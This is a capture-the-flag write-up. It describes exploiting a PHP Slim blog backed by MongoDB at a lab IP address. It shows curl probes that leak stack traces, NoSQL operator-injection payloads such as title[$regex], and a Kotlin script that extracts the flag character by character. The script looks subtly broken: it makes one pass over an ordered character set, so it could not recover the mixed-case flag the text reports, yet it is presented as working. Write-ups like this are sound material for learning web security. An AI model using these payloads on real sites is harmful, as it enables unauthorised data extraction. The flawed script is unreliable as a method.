# Blogging Web Site

Hi Expert,

some kind of blogging application remains unfinished on `http://78.128.216.18:65180`, but it can contain some information about end of the civilization. Get the content of all entries.

Good Luck

---

I tried to provoke an error in the application. Usually, navigating to a non-existing page is a good start:
```
$ curl http://78.128.216.18:65180/test
<br />
<b>Fatal error</b>:  Uncaught Slim\Exception\HttpNotFoundException: Not found. in /opt/ctfb1/web/vendor/slim/slim/Slim/Middleware/RoutingMiddleware.php:91
Stack trace:
#0 /opt/ctfb1/web/vendor/slim/slim/Slim/Routing/RouteRunner.php(72): Slim\Middleware\RoutingMiddleware-&gt;performRouting(Object(Slim\Psr7\Request))
#1 /opt/ctfb1/web/vendor/slim/twig-view/src/TwigMiddleware.php(125): Slim\Routing\RouteRunner-&gt;handle(Object(Slim\Psr7\Request))
#2 /opt/ctfb1/web/vendor/slim/slim/Slim/MiddlewareDispatcher.php(147): Slim\Views\TwigMiddleware-&gt;process(Object(Slim\Psr7\Request), Object(Slim\Routing\RouteRunner))
#3 /opt/ctfb1/web/vendor/slim/slim/Slim/MiddlewareDispatcher.php(81): class@anonymous-&gt;handle(Object(Slim\Psr7\Request))
#4 /opt/ctfb1/web/vendor/slim/slim/Slim/App.php(215): Slim\MiddlewareDispatcher-&gt;handle(Object(Slim\Psr7\Request))
#5 /opt/ctfb1/web/vendor/slim/slim/Slim/App.php(199): Slim\App-&gt;handle(Object(Slim\Psr7\Request))
#6 /opt/ctfb1/web/public/index.php(35): Slim\App-&gt;run()
#7 {main}
  thrown in <b>/opt/ctfb1/web/vendor/slim/slim/Slim/Middleware/RoutingMiddleware.php</b> on line <b>91</b><br />
```

This reveals quite a lot. The app is using PHP (namely [Slim framework](https://github.com/slimphp/Slim)) and
[Twig](https://github.com/twigphp/Twig) for templating. 

At first, I was looking for SSTI in Twig. Couldn't find any. Then, I started to fuzz `title` param.
One of the payloads I tried (using [OWASP ZAP](https://www.zaproxy.org/)) was `%999999999s`:
```
$ curl http://78.128.216.18:65180/view?title=%999999999s
<br />
<b>Fatal error</b>:   in <b>/opt/ctfb1/web/vendor/mongodb/mongodb/src/Operation/Find.php</b> on line <b>299</b><br />
```

This confirms that mongo is really being used (as one of the `TODO` entries suggests).

I left the idea of SSTI and moved to NoSQLi. After some time,
I found [A NoSQL Injection Primer with Mongo](https://nullsweep.com/a-nosql-injection-primer-with-mongo/)
and [PHP: Request Injection Attacks](https://www.php.net/manual/en/mongodb.security.request_injection.php).

I confirmed the vulnerability with `/view?title[$ne]=First%20entry`. It returns `TODO` entry. Cool!

The last step is to get the flag somehow. I tried `view?title[$regex]=A` and got `This is the flag post.`
However, we need the title...

Next, `view?title[$regex]=FLAG{.*}`. It, again, returns `This is the flag post.`. 
The plan is to simply exfiltrate the flag characters one by one:
```kotlin
import java.net.URI
import java.net.http.HttpClient
import java.net.http.HttpRequest
import java.net.http.HttpResponse

private val CHARS: List<Char> = ('0'..'9') + ('a'..'z') + ('A'..'Z') + '-'

fun main() {
    val httpClient = HttpClient.newBuilder()
        .version(HttpClient.Version.HTTP_1_1)
        .build()

    var flag = ""

    for (ch in CHARS) {
        flag += ch

        val request = HttpRequest.newBuilder()
            .GET()
            // http://78.128.216.18:65180//view?title[$regex]=FLAG{$flag.*}
            .uri(URI.create("http://78.128.216.18:65180/view?title%5B%24regex%5D=FLAG%7B$flag%2E%2A%7D"))
            .build()

        val response = httpClient.send(request, HttpResponse.BodyHandlers.ofString()).body()!!
        if (response.contains("This is the flag post.")) {
            println(flag)
            continue
        } else {
            flag = flag.dropLast(1)
        }
    }
}
```

The flag is `FLAG{LWbF-QzFv-xyCt-mkUE}`